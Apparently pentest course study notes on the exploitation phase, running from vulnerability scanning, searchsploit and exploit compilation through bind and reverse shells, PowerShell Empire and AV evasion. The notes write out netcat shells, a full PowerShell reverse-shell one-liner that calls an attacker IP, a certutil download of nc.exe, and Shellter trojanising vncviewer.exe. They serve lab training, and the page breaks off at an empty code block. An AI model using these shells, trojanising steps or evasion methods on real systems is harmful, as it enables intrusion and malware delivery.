# Exploitation

## [Exploitation](http://www.pentest-standard.org/index.php/Exploitation) Introduction <a href="#exploitation-introduction" id="exploitation-introduction"></a>

üóíÔ∏è **Exploitation** is a phase of a penetration test that focuses on establishing access, _initial foothold_, to a system or resource by bypassing security restrictions.

With a proper vulnerability analysis, the exploitation attack vector should focus on the success probability and the high value target assets with the highest impact on the scanned organization.

* _The use of automated exploitation tools (Metasploit, Powershell Empire, etc) shouldn't be prevalent_
* Exploitation methodology:
  * Identify Vulnerable Services
  * Prepare Exploit Code
  * Gaining Remote access
  * Bypass AV detection
  * Pivoting

***

## Vulnerability Scanning <a href="#vulnerability-scanning" id="vulnerability-scanning"></a>

* Identify running and vulnerable services

### [Banner Grabbing](https://cyberexperts.com/encyclopedia/banner-grabbing/) <a href="#banner-grabbing" id="banner-grabbing"></a>

üóíÔ∏è **Banner grabbing** is the info gathering manual or automatic process used to obtain software and services name and version. The host server displays a text with this information as a _banner_.

Tools and techniques:

* `nmap` service version detection scan
* `Netcat` connection
* Authentication with a supported service
* `curl` / `wget` to get headers details of an HTTP server

> üî¨ Check the [SSH Enumeration Lab here](../../assessment-methodologies/enumeration/ssh-enum/ssh-recon-basic.md)

Some useful commands from the lab environment:

* `nmap`

```bash
nmap -sV -O <TARGET_IP>
```

<figure><img src="../../../../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>

```bash
ls -al /usr/share/nmap/scripts/ | grep banner
    -rw-r--r-- 1 root root  6129 Jan  9  2019 banner.nse
    
nmap -sV --script=banner.nse <TARGET_IP>
```

<figure><img src="../../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* `nc` / `netcat`

```bash
# e.g.
nc <TARGET_IP> <TARGET_OPEN_PORT>

nc 192.67.58.3 22                      
    SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.6
```

* SSH Authentication

```bash
ssh root@<TARGET_IP>
	Welcome to attack defense ssh recon lab!! # SSH Welcome Banner
```

### [Nmap Scripts](https://nmap.org/book/nse) <a href="#nmap-scripts" id="nmap-scripts"></a>

üóíÔ∏è **Nmap Engine Scripting** (**NSE**) - an `nmap` feature that allows to write simple scripts to automate a wide variety of tasks, like:

* network discovery
* sophisticated version detection
* vulnerability detection and exploitation
* backdoor detection

Scripts are written using the **Lua** programming language.

Nmap script default directory is:

* `/usr/share/nmap/scripts`

```bash
ls -al /usr/share/nmap/scripts | grep <keyword>
```

> üî¨ Check the [Bash - ShellShock Lab here](../system-host-based-attack/linux-operating-system/bash.md)

* Some useful commands and `nmap` script scan from the lab environment:

```bash
nmap -sV -O <TARGET_IP>
```

<figure><img src="../../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```bash
nmap -sV -p 80 --script=http-enum <TARGET_IP>

ls -al /usr/share/nmap/scripts | grep shellshock
    -rw-r--r-- 1 root root  5551 Jan  9  2019 http-shellshock.nse

nmap -sV --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi" <TARGET_IP>

# Vulnerable to the CVE-2014-6271
```

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### [Metasploit](https://blog.syselement.com/ine/courses/ejpt/hostnetwork-penetration-testing/3-metasploit) <a href="#metasploit" id="metasploit"></a>

Focus on the techniques and the flow to detect vulnerabilities.

> üî¨ Home Lab based on a Windows 7/2008 R2 target vulnerable to EternalBlue SMB RCE. Check the[ Lab 2 here](../system-host-based-attack/windows-operating-system/smb.md)

```bash
sudo nmap -sS -sV <TARGET_IP>
```

```bash
searchsploit EternalBlue
searchsploit ms17-010
```

```bash
# Check the vulnerability with a scanner, before trying to exploit it
msfconsole

search eternalblue
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS <TARGET_IP>
run

use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <TARGET_IP>
run  
```

***

## Searching for Exploits <a href="#searching-for-exploits" id="searching-for-exploits"></a>

Exploit code can be found online or inside locally-stored exploit database in pentest Linux distributions (`searchsploit`, MSF).

**Verifiable online sources**:

* [exploit-db.com](https://www.exploit-db.com/)
  * always check for the **Verified** column
  * use search filters
  * [Dorks - Google Hacking Database](https://www.exploit-db.com/google-hacking-database)
* [Rapid7 db](https://www.rapid7.com/db/)

> ‚ùó **Always pay attention at publicly available exploits. An exploit can be weaponized to attack the actual attacker system!**
>
> üìå Analyze the exploit code behavior to ensure that it works as intended.

### [Searchsploit](https://www.exploit-db.com/searchsploit) <a href="#searchsploit" id="searchsploit"></a>

üóíÔ∏è **`searchsploit`** - command line search tool for Exploit-Db that allows to have an offline copy of the Exploit-Db.

* Useful for security assessments on networks without Internet access
* Pre-packed with Kali Linux
* `exploitdb` local directory is:
  * `/usr/share/exploitdb`

```bash
# Debian-based distro install
sudo apt update && sudo apt -y install exploitdb
```

```bash
ls -al /usr/share/exploitdb

# Update the exploitdb package updates
searchsploit -u
```

```bash
searchsploit [options] <term>
searchsploit vsftpd 2.3.4

# Copy an exploit to the current working dir
searchsploit -m 49757    

# Case sensitive search
searchsploit -c OpenSSH

# Search just the exploit title
searchsploit -t vsftpd

# Exact search on title
searchsploit -e "Windows 7"

# Filters search
searchsploit remote windows smb
searchsploit remote linux ssh
searchsploit remote linux ssh OpenSSH
searchsploit remote webapps wordpress
searchsploit local windows
searchsploit local windows | grep -e "Microsoft"

# List online links
searchsploit -w remote windows smb | grep -e "EternalBlue"
```

***

## Fixing Exploits <a href="#fixing-exploits" id="fixing-exploits"></a>

> üî¨ Check the [Fixing Exploits Lab here](https://blog.syselement.com/ine/courses/ejpt/hostnetwork-penetration-testing/4-exploitation/fix-exp)

### Cross-Compiling Exploits <a href="#cross-compiling-exploits" id="cross-compiling-exploits"></a>

Exploit code developed in `C`, `C++`, `C#` has to be compiled into a portable executable or binary.

üóíÔ∏è **Cross-compilation** is the process of building on one platform a binary that will run on another platform.

* Compiling `C` code is a necessary skill

> üìå [ExploitDB bin-sploits](https://github.com/offensive-security/exploitdb-bin-sploits) - **useful for pre-compiled binaries**

**`e.g.`** of Windows and Linux exploit code compiling

* [VideoLAN VLC Media Player 0.8.6f - 'smb://' URI Handling Remote Buffer Overflow](https://www.exploit-db.com/exploits/9303)
* [Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE\_POKEDATA' Race Condition Privilege Escalation (/etc/passwd Method)](https://www.exploit-db.com/exploits/40839)

#### Tools:

* [**MinGW-w64**](https://www.mingw-w64.org/)

```
sudo apt -y install mingw-w64 gcc
```

* Compile the `C` exploit
  * check for comments in the code regarding the compilation commands

```bash
# Compile for x64
x86_64-w64-mingw32-gcc 9303.c -o exploit64.exe

# Compile for x86 (32-bit)
i686-w64-mingw32-gcc 9303.c -o exploit32.exe
```

<figure><img src="../../../../.gitbook/assets/image (245).png" alt=""><figcaption></figcaption></figure>

**Linux**

* Download the DirtyCow exploit or use `searchsploit`

```bash
searchsploit Dirty Cow
searchsploit -m 40839
```

<figure><img src="../../../../.gitbook/assets/image (246).png" alt=""><figcaption></figcaption></figure>

* Compile the `C` exploit
  * check for comments in the code regarding the compilation commands to compile it successfully

```bash
# Compile with
gcc -pthread 40839.c -o dirty_exploit -lcrypt
```

<figure><img src="../../../../.gitbook/assets/image (247).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (248).png" alt=""><figcaption></figcaption></figure>

***

## Bind & Reverse [Shells](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells) <a href="#bind-and-reverse-shells" id="bind-and-reverse-shells"></a>

### [Netcat](https://blog.syselement.com/ine/courses/ejpt/penetration-testing-prerequisites/web-applications#netcat) <a href="#netcat" id="netcat"></a>

**`nc`** - a network utility used for a variety of tasks associated with TCP/UDP.

* **Client mode** - used for connection to any TCP/UDP port or to a listener
* **Server Mode** - used as a listener for connection from clients on a specific port

Functionalities:

* open TCP connections, listen on TCP or UDP ports
* Banner grabbing, Port scanning, Files transferring
* Bind/Reverse shells
* üìå [Hacking with Netcat](https://www.hackingtutorials.org/networking/hacking-with-netcat-part-1-the-basics/)

```bash
# Debian based distro - install
sudo apt update && sudo apt install -y netcat
```

> üî¨ Some HFS Lab commands

```bash
nc <TARGET_IP> <TARGET_PORT>
nc -nv 10.0.20.107 80
# -n = no DNS resolution
# -v = verbose

nc -nvu 10.0.20.107 445
# -u = UDP port
```

Setup a listener:

* Transfer `nc.exe` to the windows target
* Attacker Machine IP: `10.10.16.2`
* Target Machine IP: `10.0.20.107`

```bash
# Attacker machine (10.0.20.107)
cd /usr/share/windows-binaries/
python -m SimpleHTTPServer 80


# Target machine
cd Desktop
certutil -urlcache -f http://10.10.24.4/nc.exe nc.exe
```

<figure><img src="../../../../.gitbook/assets/image (10) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* Setup a listener on the attacker machine

```bash
# Attacker machine
nc -nvlp 1234
nc -nvlup 1234 # listen on a UDP port


# Target machine
nc.exe -nv 10.10.16.2 1234
nc.exe -nvu 10.10.16.2 1234

# A connection is received on the Attacker machine
```

<figure><img src="../../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* Transfer files with `nc`

```bash
# A listener must be present on the target system
# Target machine
nc.exe -nvlp 1234 > test.txt

# Attacker machine
echo "Hello target" > test.txt
nc -nv 10.0.20.107 1234 < test.txt
```

<figure><img src="../../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Bind Shells <a href="#bind-shells" id="bind-shells"></a>

> üìå [Bind and Reverse shells](https://www.hackingtutorials.org/networking/hacking-netcat-part-2-bind-reverse-shells/)

<figure><img src="https://blog.syselement.com/~gitbook/image?url=https%3A%2F%2F1996978447-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FlhjuckuLbvBn36EoFL7P%252Fuploads%252Fgit-blob-0b6b9e4f95832943fc76812597d3018a926b5fbe%252FBindShell-660x309.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=4&#x26;quality=100&#x26;sign=c4940281&#x26;sv=1" alt=""><figcaption><p>Bind Shell - geeksforgeeks.org</p></figcaption></figure>

üóíÔ∏è **Bind Shell** - a remote shell where _the attacker connects to the listener running on the target system_ and execute commands on the target system.

* _Bind shells issues_:
  * Must have access to the target system
  * Inbound traffic can be blocked by a firewall, it is very suspect
* A `netcat` listener must be configured on the target system to execute:
* `cmd.exe` - Windows
* `/bin/bash` - Linux

> üî¨ Same lab as above (IPs might change)

* Once uploaded the `nc.exe` on the target system, proceed with the bind shell

```bash
# Target Win machine - Bind shell listener with executable cmd.exe
nc.exe -nvlp 1234 -e cmd.exe

# Attacker Linux machine
nc -nv 10.0.26.170 1234
```

<figure><img src="../../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```bash
# Target Linux machine - Bind shell listener with /bin/bash
nc -nvlp 1234 -c /bin/bash

# Attacker Win machine
nc.exe -nv 10.10.21.3 1234
```

<figure><img src="../../../../.gitbook/assets/image (5) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Reverse Shells <a href="#reverse-shells" id="reverse-shells"></a>

<figure><img src="https://blog.syselement.com/~gitbook/image?url=https%3A%2F%2F1996978447-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FlhjuckuLbvBn36EoFL7P%252Fuploads%252Fgit-blob-3d4de9ede03acd8e2aedb7dfbcec6084558939f0%252FReverseshell-660x309.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=4&#x26;quality=100&#x26;sign=8adec4bd&#x26;sv=1" alt=""><figcaption><p>Reverse Shell - geeksforgeeks.org</p></figcaption></figure>

üóíÔ∏è **Reverse Shell** - a remote shell where _the target connects to a listener running on the attacker's system_ (**`e.g.`** Metasploit Meterpreter).

* _Reverse shells advantages_:
  * The connection can be initialized without `netcat` too
  * Outgoing traffic may not be blocked by firewalls
* _Reverse shells issues_:
  * used exploit have to know the attacker's IP
  * the attacker's IP can be logged as malicious or present in the exploit file

```bash
# Attacker Linux machine
nc -nvlp 1234

# Target Win machine
nc.exe -nv 10.0.28.22 1234 -e cmd.exe
```



<figure><img src="../../../../.gitbook/assets/image (6) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```bash
# Attacker Linux machine
nc -nvlp 1234

# Target Linux machine (localhost in this case)
nc -nv 127.0.0.1 1234 -e /bin/bash
```

<figure><img src="../../../../.gitbook/assets/image (7) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

#### **Reverse Shell without Netcat**

üìå [PayloadsAllTheThings - Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

* Examples of Reverse Shell with different code (bash, Python, Powershell, PHP, etc)

<figure><img src="https://blog.syselement.com/~gitbook/image?url=https%3A%2F%2F1996978447-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FlhjuckuLbvBn36EoFL7P%252Fuploads%252Fgit-blob-9864dbb1152baa998c1b83c300ba73f798642c7f%252Fimage-20230423230818018.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=4&#x26;quality=100&#x26;sign=660d009b&#x26;sv=1" alt=""><figcaption></figcaption></figure>

#### üìå [Reverse Shell Generator](https://www.revshells.com/)

<figure><img src="https://blog.syselement.com/~gitbook/image?url=https%3A%2F%2F1996978447-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FlhjuckuLbvBn36EoFL7P%252Fuploads%252Fgit-blob-5fa4e4118b64b7872bf51aa1a199c5f6ed73627d%252Fimage-20230423230905165.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=4&#x26;quality=100&#x26;sign=34b7e467&#x26;sv=1" alt=""><figcaption></figcaption></figure>

**`e.g.`**

```bash
# Kali Linux attacker machine
nc -nvlp 9001
```

```bash
# Windows target machine
# Run CMD and paste the code below
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.42.132',9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

<figure><img src="../../../../.gitbook/assets/image (9) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (8) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

***

## Exploitation Frameworks <a href="#exploitation-frameworks" id="exploitation-frameworks"></a>

### [The Metasploit Framework](https://blog.syselement.com/ine/courses/ejpt/hostnetwork-penetration-testing/3-metasploit) <a href="#the-metasploit-framework" id="the-metasploit-framework"></a>

* Focus on the **Exploitation** phase
* Modular
* MSF turns the exploit code into a module, using the `Ruby` programming language

> üî¨ Check the [Workflow Platform Lab here](https://app.gitbook.com/o/erINDgTXVh2ylWBxpoDg/s/OVa8OVKg2HE0a3ygHQE9/\~/changes/43/courses/ejptv2-notes/host-and-networking-penetration-testing/exploitation/win-workflow-platform-ms)

### [PowerShell-Empire](https://github.com/BC-SECURITY/Empire) <a href="#powershell-empire" id="powershell-empire"></a>

**`Empire`** - PowerShell post-exploitation framework for Win, Linux and macOS

> _Empire is a post-exploitation and adversary emulation framework that is used to aid Red Teams and Penetration Testers. The Empire server is written in Python 3 and is modular to allow operator flexibility. Empire comes built-in with a client that can be used remotely to access the server. There is also a GUI available for remotely accessing the Empire server,_ [_Starkiller_](https://github.com/BC-SECURITY/Starkiller)_._

* PowerShell-Empire is primarily designed for Windows targets
* **`Starkiller`** - GUI frontend for `PowerShell-Empire`
* [Kali Linux install](https://www.kali.org/tools/powershell-empire/)

```bash
sudo apt update && sudo apt install -y powershell-empire
```

> üî¨ Home Lab based on a Kali Linux attacker VM and Win7 target VM with IP `192.168.31.131`

```bash
sudo powershell-empire server
```

<figure><img src="../../../../.gitbook/assets/image (16) (1) (1).png" alt=""><figcaption></figcaption></figure>

* In another terminal tab

```bash
sudo powershell-empire client
```

<figure><img src="../../../../.gitbook/assets/image (17) (1) (1).png" alt=""><figcaption></figcaption></figure>

```bash
listeners
agents
```

<figure><img src="../../../../.gitbook/assets/image (18) (1) (1).png" alt=""><figcaption></figcaption></figure>

* Open Starkiller
  * `http://localhost:1337/index.html#/`
  * Credentials: `empireadmin`:`password123`

<figure><img src="../../../../.gitbook/assets/image (19) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (20) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (21) (1).png" alt=""><figcaption></figcaption></figure>

* Run the `csharpserver`

<figure><img src="../../../../.gitbook/assets/image (22) (1).png" alt=""><figcaption></figcaption></figure>

* Create a `http` **listener** to receive the reverse connection from the target system

<figure><img src="../../../../.gitbook/assets/image (23) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (24) (1).png" alt=""><figcaption></figcaption></figure>

* Generate a **Stager** with `windows_csharp_exe` type

<figure><img src="../../../../.gitbook/assets/image (25) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>

* Actions - Download the `Sharpire.exe` stager

```bash
# Open a new terminal window
cd Downloads
python3 -m http.server 80

# On the Windows VM download the Sharpire.exe from http://192.168.42.132/
# Run it
```

<figure><img src="../../../../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>

* Back on the Starkiller **Agents** page, check for the active agent

<figure><img src="https://blog.syselement.com/~gitbook/image?url=https%3A%2F%2F1996978447-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FlhjuckuLbvBn36EoFL7P%252Fuploads%252Fgit-blob-5210942bbc1c64b8c802cbb74afd0ade329272e5%252Fimage-20230424003448219.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=4&#x26;quality=100&#x26;sign=94c6c323&#x26;sv=1" alt=""><figcaption><p>Agents</p></figcaption></figure>

<figure><img src="https://blog.syselement.com/~gitbook/image?url=https%3A%2F%2F1996978447-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FlhjuckuLbvBn36EoFL7P%252Fuploads%252Fgit-blob-17d68fe9b29edca4b188f315e25d5a2e39c17acd%252Fimage-20230424003849568.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=4&#x26;quality=100&#x26;sign=d277b488&#x26;sv=1" alt=""><figcaption><p>File Browser</p></figcaption></figure>

* Back in the Empire terminal session

```bash
agents
interact <ID>
history
```

<figure><img src="https://blog.syselement.com/~gitbook/image?url=https%3A%2F%2F1996978447-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FlhjuckuLbvBn36EoFL7P%252Fuploads%252Fgit-blob-5a7c3603dee4d39763bb316782820f8fed844ab3%252Fimage-20230424004056233.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=4&#x26;quality=100&#x26;sign=9311a90&#x26;sv=1" alt=""><figcaption></figcaption></figure>

***

## Windows Black Box Exploitation <a href="#windows-black-box-exploitation" id="windows-black-box-exploitation"></a>

üóíÔ∏è **Black Box** penetration test - security assessment conducted without any internal system or network knowledge.

* The pentester act like an _external unprivileged hacker from outside the network_
* No information about the target system

Typical **Black Box Methodology**:

* Host discovery ‚û°Ô∏è Port Scanning ‚û°Ô∏è Enumeration
* Vulnerability detection
* Exploitation ‚û°Ô∏è Manual/Automated
* Post Exploitation - PrivEsc ‚û°Ô∏è Persistence ‚û°Ô∏è Dumping Hashes

**`e.g.`**

**Scenario**

* Penetration Test to gain access and exploit a Win Server 2008 host.

**Scope**

* Identify running and vulnerable services on the target
* Exploit the vulnerabilities to obtain a foothold

> üî¨ The techniques will be covered in the dedicated [Win Black Box Pentest Lab here](https://blog.syselement.com/ine/courses/ejpt/hostnetwork-penetration-testing/4-exploitation/win-blackbox-exp). This is a lab containing a [Metasploitable3](https://github.com/rapid7/metasploitable3) target.
>
> * Identify easily exploitable services
> * Pick the target as efficiently as possible
> * Time is a factor

***

## Linux Black Box Exploitation <a href="#linux-black-box-exploitation" id="linux-black-box-exploitation"></a>

**Scenario**

* Penetration Test to gain access and exploit a Linux server host.

**Scope**

* Identify running and vulnerable services on the target
* Exploit the vulnerabilities to obtain a foothold and gain access to the system

> üî¨ The techniques will be covered in the dedicated [Linux Black Box Pentest Lab here](https://app.gitbook.com/o/erINDgTXVh2ylWBxpoDg/s/OVa8OVKg2HE0a3ygHQE9/\~/changes/45/courses/ejptv2-notes/host-and-networking-penetration-testing/exploitation/linux-black-box-pentest). This is a lab containing a [Metasploitable2](https://docs.rapid7.com/metasploit/metasploitable-2/) target.

***

## AV Evasion & Obfuscation <a href="#av-evasion-and-obfuscation" id="av-evasion-and-obfuscation"></a>

üóíÔ∏è [**Defense Evasion**](https://attack.mitre.org/tactics/TA0005/) _consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or **obfuscating/encrypting** data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware._ (MITRE)

* **Antivirus detection methods** can be classified as follows:

<table><thead><tr><th width="198">Method</th><th>Description</th></tr></thead><tbody><tr><td><strong>Signature based detection</strong></td><td>A signature is a static unique sequence of bytes of known malware, created using essential elements of an analyzed file. The AV comes with a signature database</td></tr><tr><td><strong>Heuristic base detection</strong></td><td>Statically examine files for suspicious specific characteristics, relying on rules to determine a malicious binary</td></tr><tr><td><strong>Behavior based detection</strong></td><td>Monitor malware for suspicious behavior</td></tr></tbody></table>

* **On-disk Evasion** techniques
  * **Obfuscation** - _The act of hiding anything crucial, useful, or vital. Code is reorganized through obfuscation to make it more difficult to decipher or reverse engineer._
  * **Encoding** - _The process of transforming data into a new format using an encoding strategy. Data can be encoded to a new format and then decoded back to its original format since **encoding is a reversible operation**._
  * **Packing** - _Generate executables with updated binary structures, lower in size and a new payload's signature._
  * **Crypters** - _Encrypts payloads, then the encrypted code is decrypted in memory. The decryption key is typically kept in a stub._ (ransomware)
* **In-memory Evasion** techniques
  * _Memory manipulation_ rather than writing files to disk
  * Payload is injected into a process, then executed in memory in a separate thread

### [Shellter](https://www.shellterproject.com/introducing-shellter/) <a href="#shellter" id="shellter"></a>

**`Shellter`** - _dynamic shellcode injection tool and dynamic PE (Portable Executable) infector ever created._

* Uses a unique dynamic approach based on the execution flow of the target app
* Takes advantage of the original structure of the PE file
* Supports any 32-bit payload (generated either by metasploit or custom ones by the user)
* Portable
* Compatible with Windows x86/x64 (XP SP3 and above) & Wine/CrossOver for Linux/Mac

> üî¨ Home lab with Kali Linux and Win7 VMs

[Shellter Kali Linux Installation](https://www.kali.org/tools/shellter/):

```bash
sudo apt update && sudo apt install -y shellter

# Wine64 will be automatically installed
# Win32 needs additional commands to install it
sudo dpkg --add-architecture i386 && sudo apt update && sudo apt -y install wine32
rm -r ~/.wine
```

```bash
cd /usr/share/windows-resources/shellter
```

* Execute an `exe` file on Linux

```
sudo shellter
```

<figure><img src="https://blog.syselement.com/~gitbook/image?url=https%3A%2F%2F1996978447-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FlhjuckuLbvBn36EoFL7P%252Fuploads%252Fgit-blob-f5809aa6290bf63db5b48966a81728891c4714d1%252Fimage-20230424164836529.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=4&#x26;quality=100&#x26;sign=f11811d4&#x26;sv=1" alt=""><figcaption><p>Shellter</p></figcaption></figure>

* Inject the shellcode into`/usr/share/windows-binaries/vncviewer.exe` file after copying it to a folder

```bash
mkdir AVBypass
cd AVBypass
cp /usr/share/windows-binaries/vncviewer.exe .
```

* In the `SHELLTER` windows, choose `A` for automatic
* PE Target: `/home/kali/certs/ejpt/AVBypass/vncviewer.exe`

<figure><img src="https://blog.syselement.com/~gitbook/image?url=https%3A%2F%2F1996978447-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FlhjuckuLbvBn36EoFL7P%252Fuploads%252Fgit-blob-82c3786c92833e3b03e5420ada31c9d12e17fb6d%252Fimage-20230424171059096.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=4&#x26;quality=100&#x26;sign=6eb7f781&#x26;sv=1" alt=""><figcaption></figcaption></figure>

* Stealth Mode: `Y` = `vncviewer` will function as normal and the shellcode will be executed in the background
* Payload: `L` - `1`
* LHOST: Attacker's IP - `192.168.31.128`
* LPORT: `1234`

<figure><img src="https://blog.syselement.com/~gitbook/image?url=https%3A%2F%2F1996978447-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FlhjuckuLbvBn36EoFL7P%252Fuploads%252Fgit-blob-b6b51ee9935c98961202b7635edd81e1cc2e1596%252Fimage-20230424165719721.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=4&#x26;quality=100&#x26;sign=dee1ed5&#x26;sv=1" alt=""><figcaption></figcaption></figure>

<figure><img src="https://blog.syselement.com/~gitbook/image?url=https%3A%2F%2F1996978447-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FlhjuckuLbvBn36EoFL7P%252Fuploads%252Fgit-blob-4bf44515069cb081484551a0c531149fce77df42%252Fimage-20230424165739262.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=4&#x26;quality=100&#x26;sign=10a53b3a&#x26;sv=1" alt=""><figcaption></figcaption></figure>

* Now the `/home/kali/certs/ejpt/AVBypass/vncviewer.exe` **file has been replaced by the Shellter generated malicious executable**
* Copy the `vncviewer.exe` file to the target machine

```bash
# Attacker VM
cd /home/kali/certs/ejpt/AVBypass/
sudo python -m http.server 80

# In another terminal
msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.31.128
set LPORT 1234
run
```

<figure><img src="https://blog.syselement.com/~gitbook/image?url=https%3A%2F%2F1996978447-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FlhjuckuLbvBn36EoFL7P%252Fuploads%252Fgit-blob-4a46a4cecf24d8fe26e04239a8d15b1d1aca5319%252Fimage-20230424171306459.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=4&#x26;quality=100&#x26;sign=99922b92&#x26;sv=1" alt=""><figcaption><p>vncviewer.exe file copied</p></figcaption></figure>

* Run the `vncviewer.exe` file and chheck the `msfconsole` Meterpreter session

<figure><img src="https://blog.syselement.com/~gitbook/image?url=https%3A%2F%2F1996978447-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FlhjuckuLbvBn36EoFL7P%252Fuploads%252Fgit-blob-86ca727ab64a3ceeb3a6463007b855cf3655aa22%252Fimage-20230424171404008.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=4&#x26;quality=100&#x26;sign=a2b3ebd4&#x26;sv=1" alt=""><figcaption></figcaption></figure>

### PowerShell Code Obfuscation <a href="#powershell-code-obfuscation" id="powershell-code-obfuscation"></a>

[**`Invoke-Obfuscation`**](https://github.com/danielbohannon/Invoke-Obfuscation) - _a PowerShell v2.0+ compatible PowerShell command and script obfuscator._

> üî¨ Home lab with Kali Linux and Win7 VMs

* Kali Linux install PowerShell

```bash
cd /opt
sudo git clone https://github.com/danielbohannon/Invoke-Obfuscation.git
sudo apt update && sudo apt install -y powershell
```

* Run `pwsh`

```bash
pwsh
cd /opt/Invoke-Obfuscation/
Import-Module ./Invoke-Obfuscation.psd1
cd ..
Invoke-Obfuscation
```

<figure><img src="https://blog.syselement.com/~gitbook/image?url=https%3A%2F%2F1996978447-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FlhjuckuLbvBn36EoFL7P%252Fuploads%252Fgit-blob-0736bb825c85394c630138f91993999bdb899b24%252Fimage-20230424172552425.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=4&#x26;quality=100&#x26;sign=5b4c8dab&#x26;sv=1" alt=""><figcaption><p>Invoke-Obfuscation</p></figcaption></figure>

* Create the reverse PowerShell script in a new file
  * PowerShell Reverse Shell code will be

```bash
cd /home/kali/certs/ejpt/AVBypass/    
nano shell.ps1
```

```bash
